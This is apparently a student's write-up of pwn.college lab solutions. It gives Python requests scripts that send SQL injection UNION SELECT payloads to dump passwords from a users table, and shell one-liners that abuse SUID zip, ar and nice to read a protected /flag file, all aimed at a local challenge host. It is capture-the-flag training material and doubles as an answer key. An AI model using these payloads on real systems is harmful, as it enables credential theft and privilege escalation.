# LAB-2 SQL Injection and SUID Exploitation from PWN College

## [Press here to return to HOME](../index.md)

## SQL Injection

### Level 3 
```bash
curl "http://challenge.localhost:80/?user=1"
```

### Level 5 
```python 
import requests 

payload = { "query": '" UNION SELECT password FROM users --' } 

response = requests.post("http://challenge.localhost/", params=payload) 
print(response.text)
```

### Level 7
```python 
import requests

payload = {"username": "flag", "password": '" UNION SELECT password, * FROM users --'} 

response = requests.post("http://challenge.localhost/", payload) 
print(response.text)    
```

## SUID Exploitation

### Level 19
```bash
zip flag.zip /flag

unzip -c flag.zip
```

### Level 21
```bash
ar r flag.a /flag

ar p flag.a
```

### Level 27
```bash 
nice cat /flag 
```
